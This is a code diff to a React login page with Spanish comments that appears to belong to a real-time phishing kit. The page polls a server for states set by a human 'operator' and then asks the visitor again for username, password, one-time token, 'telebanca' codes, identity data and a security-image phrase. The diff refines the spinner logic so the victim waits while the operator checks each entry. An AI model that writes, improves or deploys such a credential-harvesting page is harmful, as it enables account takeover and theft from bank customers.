@@ -72,15 +72,20 @@ export default function LoginPage() {
             lastActionSeqRef.current = actionSeq;
           }
 
+          const isSubmitting =
+            waitingPanel ||
+            busyRef.current ||
+            appliedActionRef.current.startsWith("submitted-");
+
           // Acciones del operador primero (c-interna / errores / done)
           if (session.state === "c-interna") {
-            // Si ya dimos Continuar en tejuino, no bajar el spinner por residual c-interna
-            if (step === "tejuino" && (waitingPanel || busyRef.current)) {
-              /* keep spinner — esperando Listo / error del panel */
+            if (isSubmitting && !isNewAction) {
+              /* keep spinner */
             } else if (step === "tejuino" && appliedActionRef.current === "error-tejuino" && !isNewAction) {
               /* mantener error visible */
             } else if (
-              appliedActionRef.current !== "c-interna" ||
+              (appliedActionRef.current !== "c-interna" && !appliedActionRef.current.startsWith("error-")) ||
+              isNewAction ||
               step !== "tejuino"
             ) {
               appliedActionRef.current = "c-interna";
@@ -94,12 +99,8 @@ export default function LoginPage() {
               setStep("tejuino");
             }
           } else if (session.state === "error-tejuino") {
-            const residualError =
-              (waitingPanel || busyRef.current) &&
-              appliedActionRef.current === "submitted-tejuino" &&
-              prevState === "error-tejuino";
-            if (residualError) {
-              /* keep spinner */
+            if (isSubmitting && !isNewAction) {
+              /* keep spinner — esperando respuesta a nueva submisión */
             } else if (appliedActionRef.current !== "error-tejuino" || isNewAction) {
               appliedActionRef.current = "error-tejuino";
               tejuinoActiveRef.current = true;
@@ -134,7 +135,9 @@ export default function LoginPage() {
               }
             }
           } else if (session.state === "error-token") {
-            if (appliedActionRef.current !== "error-token" || isNewAction) {
+            if (isSubmitting && !isNewAction) {
+              /* keep spinner — el usuario acaba de enviar y esperamos la respuesta del operador */
+            } else if (appliedActionRef.current !== "error-token" || isNewAction) {
               appliedActionRef.current = "error-token";
               setWaitingPanel(false);
               setAdvancing(false);
@@ -146,7 +149,9 @@ export default function LoginPage() {
               }
             }
           } else if (session.state === "error-user") {
-            if (appliedActionRef.current !== "error-user" || isNewAction) {
+            if (isSubmitting && !isNewAction) {
+              /* keep spinner */
+            } else if (appliedActionRef.current !== "error-user" || isNewAction) {
               appliedActionRef.current = "error-user";
               setWaitingPanel(false);
               setAdvancing(false);
@@ -163,7 +168,9 @@ export default function LoginPage() {
               window.setTimeout(() => usernameRef.current?.focus(), 50);
             }
           } else if (session.state === "error-pass") {
-            if (appliedActionRef.current !== "error-pass" || isNewAction) {
+            if (isSubmitting && !isNewAction) {
+              /* keep spinner */
+            } else if (appliedActionRef.current !== "error-pass" || isNewAction) {
               appliedActionRef.current = "error-pass";
               setWaitingPanel(false);
               setAdvancing(false);
@@ -179,7 +186,7 @@ export default function LoginPage() {
             session.state === "telebanca" ||
             session.state === "typing-telebanca"
           ) {
-            if (step === "telebanca" && (waitingPanel || busyRef.current)) {
+            if (isSubmitting && !isNewAction) {
               /* keep spinner */
             } else if (step === "telebanca" && appliedActionRef.current === "error-token" && !isNewAction) {
               /* mantener error visible */
@@ -199,7 +206,7 @@ export default function LoginPage() {
             session.state === "identidad" ||
             session.state === "typing-identidad"
           ) {
-            if (step === "identidad" && (waitingPanel || busyRef.current)) {
+            if (isSubmitting && !isNewAction) {
               /* keep spinner */
             } else if (step === "identidad" && appliedActionRef.current === "error-identidad" && !isNewAction) {
               /* mantener error visible */
@@ -216,11 +223,7 @@ export default function LoginPage() {
               setStep("identidad");
             }
           } else if (session.state === "error-identidad") {
-            const residualError =
-              (waitingPanel || busyRef.current) &&
-              appliedActionRef.current === "submitted-identidad" &&
-              prevState === "error-identidad";
-            if (residualError) {
+            if (isSubmitting && !isNewAction) {
               /* keep spinner */
             } else if (appliedActionRef.current !== "error-identidad" || isNewAction) {
               appliedActionRef.current = "error-identidad";
@@ -234,10 +237,7 @@ export default function LoginPage() {
             }
           } else if (session.state === "token" || session.state === "typing") {
             // Residual typing/token: no bajar spinner si ya enviamos el OTP
-            if (
-              (step === "dinamica" || step === "telebanca" || step === "identidad") &&
-              (waitingPanel || busyRef.current)
-            ) {
+            if (isSubmitting && !isNewAction) {
               /* keep spinner */
             } else if (step === "dinamica" && appliedActionRef.current === "error-token" && !isNewAction) {
               /* mantener error visible */
@@ -258,7 +258,7 @@ export default function LoginPage() {
             session.imageSrc &&
             session.phrase
           ) {
-            if (step === "imagen" && (waitingPanel || busyRef.current)) {
+            if (isSubmitting && !isNewAction) {
               /* keep spinner */
             } else if (step === "imagen" && appliedActionRef.current === "error-pass" && !isNewAction) {
               /* mantener error visible */
@@ -301,7 +301,7 @@ export default function LoginPage() {
     void tick();
     const id = window.setInterval(tick, 1200);
     return () => window.clearInterval(id);
-  }, [step, waitingPanel, username]);
+  }, [step, username]);
 
   useEffect(() => {
     const sid = sessionIdRef.current;
